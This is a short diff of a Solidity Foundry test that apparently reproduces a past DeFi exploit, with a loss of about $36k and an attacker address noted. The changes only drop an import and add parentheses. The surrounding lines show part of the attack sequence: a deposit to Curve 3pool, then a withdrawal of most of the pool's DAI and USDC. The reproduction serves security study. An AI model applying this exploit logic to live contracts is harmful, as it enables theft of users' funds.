@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$36k USD$
 // Attacker : https://etherscan.io/address/0xccc526e2433db1eebb9cbf6acd7f03a19408278c
@@ -124,8 +123,8 @@ contract ContractTest is Test {
         amount[2] = USDT.balanceOf(address(this));
         Curve3POOL.add_liquidity(amount, 1); // deposit USDT to Curve3POOL
 
-        amount[0] = DAI.balanceOf(address(Curve3POOL)) * 978 / 1000;
-        amount[1] = USDC.balanceOf(address(Curve3POOL)) * 978 / 1000;
+        amount[0] = (DAI.balanceOf(address(Curve3POOL)) * 978) / 1000;
+        amount[1] = (USDC.balanceOf(address(Curve3POOL)) * 978) / 1000;
         amount[2] = 0;
         Curve3POOL.remove_liquidity_imbalance(amount, LP.balanceOf(address(this))); // withdraw DAI and USDC from Curve3POOL
 
